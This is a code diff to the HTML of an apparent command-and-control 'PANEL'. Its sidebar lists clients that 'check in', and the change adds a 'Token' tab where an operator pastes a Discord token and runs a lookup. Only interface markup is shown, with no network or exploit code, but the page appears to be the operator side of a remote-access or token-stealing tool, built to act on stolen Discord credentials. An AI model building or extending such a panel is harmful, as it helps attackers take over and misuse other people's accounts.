@@ -13,13 +13,26 @@
       <h1>PANEL</h1>
       <span class="sbstats" id="sbstats">0</span>
     </div>
-    <div class="sbsearch">
-      <input type="text" id="search" placeholder="search clients..." oninput="onsearch()">
+    <div class="sbtabs">
+      <button class="stab active" data-tab="clients" onclick="switchTab('clients')">Clients</button>
+      <button class="stab" data-tab="token" onclick="switchTab('token')">Token</button>
     </div>
-    <div class="sbtoolbar">
-      <button onclick="clearall()" title="clear all">clear</button>
+    <div id="tab-clients">
+      <div class="sbsearch">
+        <input type="text" id="search" placeholder="search clients..." oninput="onsearch()">
+      </div>
+      <div class="sbtoolbar">
+        <button onclick="clearall()" title="clear all">clear</button>
+      </div>
+      <div id="clientlist"></div>
     </div>
-    <div id="clientlist"></div>
+    <div id="tab-token" style="display:none">
+      <div class="sbtoolbar" style="padding:10px 12px;flex-direction:column;gap:8px">
+        <input type="text" id="tokenInput" placeholder="paste Discord token..." style="width:100%;padding:6px 8px;background:#12122a;border:1px solid #1a1a30;color:#ccc;border-radius:4px;outline:none" spellcheck="false">
+        <button onclick="lookupToken()" style="width:100%;padding:6px;background:#5865f2;color:#fff;border:none;border-radius:4px;cursor:pointer">Lookup</button>
+        <div id="tokenStatus" style="font-size:11px;color:#666;text-align:center"></div>
+      </div>
+    </div>
   </aside>
   <main id="main">
     <div id="welcome">
@@ -28,6 +41,7 @@
       <p>clients will appear here when they check in</p>
     </div>
     <div id="detail"></div>
+    <div id="tokenResult" style="display:none;padding:20px"></div>
   </main>
 </div>
 <div id="toasts"></div>
